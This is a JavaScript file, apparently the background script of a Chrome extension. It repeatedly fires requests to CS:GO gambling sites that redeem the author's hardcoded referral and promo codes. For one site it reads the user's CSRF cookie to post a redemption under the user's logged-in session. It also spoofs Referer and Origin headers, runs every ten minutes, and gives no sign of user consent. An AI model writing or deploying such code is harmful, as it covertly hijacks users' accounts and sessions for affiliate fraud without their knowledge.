var headers =
{
	forUrl : null,
	Referer : null,
	Origin : null,
	'User-Agent' : null
}

function changeHeadersForTheNextRequest(obj)
{
	headers =
	{
		forUrl : obj.forUrl,
		Referer : obj.Referer,
		Origin : obj.Origin,
		'User-Agent' : obj['User-Agent']
	}
}

function createRandomString(numb)
{
	var text = "";
	var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	for( var i = 0; i < numb; i++ )
		text += possible.charAt(Math.floor(Math.random() * possible.length));
	return text;
}

function multipartFormDataEncode(data, boundary)
{
	//var boundary = String(Math.random()).slice(2);
	var boundaryMiddle = '--' + boundary + '\r\n';
	var boundaryLast = '--' + boundary + '--\r\n'

	var body = ['\r\n'];
	for (var key in data)
	{
		body.push('Content-Disposition: form-data; name="' + key + '"\r\n\r\n' + data[key] + '\r\n');
	}

	body = body.join(boundaryMiddle) + boundaryLast;
	return body;
}

var sites =
{
	csgocash : function()
	{
		var link = 'https://csgo.cash/affiliate/';
		var method = 'GET';
		var refCode = '76561198127614937';
		link = link + refCode;
		var xhr = new XMLHttpRequest();
		xhr.open(method, link, true);
		changeHeadersForTheNextRequest(
		{
			forUrl : link,
			Referer : 'https://extensions.risenraise.com/'
		});
		xhr.send();
	},
	csgopolygon : function()
	{
		var link = 'https://csgopolygon.com/scripts/_redeem.php?code=';
		var method = 'GET';
		var refCode = 'LOLKEKMDMA';
		link = link + refCode;
		var xhr = new XMLHttpRequest();
		xhr.open(method, link, true);
		changeHeadersForTheNextRequest(
		{
			forUrl : link,
			Referer : 'https://csgopolygon.com/'
		});
		xhr.send();
	},
	csgoroll : function()
	{
		var link = 'http://csgoroll.com/promo/';
		var method = 'GET';
		var refCode = 'LOLKEKMDMA';
		link = link + refCode;
		var xhr = new XMLHttpRequest();
		xhr.open(method, link, true);
		xhr.send();
	},
	'csgo-case' : function()
	{
		chrome.cookies.get(
		{
			url : 'https://csgo-case.com/',
			name : 'loggedInCSRFString'
		}, function (cookie)
		{
			if(cookie && cookie.value)
			{
				var csrfToken = cookie.value;
				var link = 'https://csgo-case.com/data/PHP/nocache/RAF/redeem_a_code.php';
				var method = 'POST';
				var refCode = 'LOLKEKMDMA';
				var data =
				{
					code : refCode,
					CSRFString : csrfToken
				}
				var xhr = new XMLHttpRequest();
				xhr.open(method, link, true);
				xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
				xhr.setRequestHeader('x-requested-with', 'XMLHttpRequest');
				changeHeadersForTheNextRequest(
				{
					forUrl : link,
					Origin : 'https://csgo-case.com',
					Referer : 'https://csgo-case.com/code/'
				});
				xhr.send($.param(data));
			}
		});
	},
	drakelounge : function()
	{
		var link = 'https://www.drakelounge.com/use-promo';
		var method = 'POST';
		var refCode = 'LOLKEKMDMA';
		var data =
		{
			id : refCode
		}
		var xhr = new XMLHttpRequest();
		xhr.open(method, link, true);
		var boundary = '----WebKitFormBoundary' + createRandomString(16);
		xhr.setRequestHeader('content-type', 'multipart/form-data; boundary=' + boundary);
		xhr.setRequestHeader('x-requested-with', 'XMLHttpRequest');
		changeHeadersForTheNextRequest(
		{
			forUrl : link,
			Origin : 'https://www.drakelounge.com',
			Referer : 'https://www.drakelounge.com/promocode'
		});
		xhr.send(multipartFormDataEncode(data, boundary));
	}
}

function sender()
{
	for(let n in sites)
	{
		sites[n]();
	}
}

setInterval(sender, 10*60*1000);
sender();